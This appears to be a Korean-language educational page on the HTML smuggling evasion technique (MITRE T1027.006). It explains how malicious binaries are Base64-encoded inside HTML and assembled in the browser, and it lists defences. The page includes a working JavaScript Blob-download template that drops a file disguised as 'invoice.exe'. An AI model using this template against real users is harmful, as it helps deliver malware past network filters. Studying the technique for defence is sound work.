T1027.006: HTML Smuggling

Defense Evasion

HTML Smuggling

HTML과 JavaScript로 브라우저에서 직접 악성 파일을 생성하여 네트워크 보안을 우회

#1. HTML 스머글링이란?

"택배 분해 배송" 비유

세관(프록시/방화벽)을 통과하기 위해 완성품(악성파일)을 부품(Base64 문자열)으로 분해하여 배송합니다. HTML 페이지 안에 Base64로 인코딩된 데이터를 숨기고, 브라우저의 JavaScript가 이를 조립하여 파일로 다운로드합니다. 네트워크 단에서는 정상적인 HTML 페이지만 보이므로, 프록시/IDS가 악성 파일을 탐지할 수 없습니다.

1단계: 숨기기

악성 바이너리를 Base64로 인코딩하여 HTML/JS 안에 삽입

2단계: 전달

이메일 첨부 또는 URL로 HTML 파일 전달 (정상 웹페이지처럼 보임)

3단계: 조립

브라우저 JavaScript가 Blob API로 바이너리를 조립 후 자동 다운로드

#2. 공격 기법

// HTML Smuggling — Blob API 방식
<script>
var b64 = "TVqQAAMAAAAEAAAA...";
var bin = atob(b64);
var bytes = new Uint8Array(bin.length);
for(var i=0; i<bin.length; i++) bytes[i]=bin.charCodeAt(i);
var blob = new Blob([bytes], {type:'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'invoice.exe';
a.click();
</script>
// 네트워크에서는 HTML만 보이고, 브라우저에서 .exe가 생성됨

방어 방법

  • Mark of the Web (MOTW): Zone.Identifier로 다운로드 출처 추적
  • 브라우저 정책: data:/blob: URI에서 다운로드 차단
  • EDR: 브라우저 프로세스의 파일 생성 모니터링
  • 이메일 게이트웨이: HTML 첨부파일의 JavaScript 분석
  • SmartScreen: MOTW 기반 실행 차단
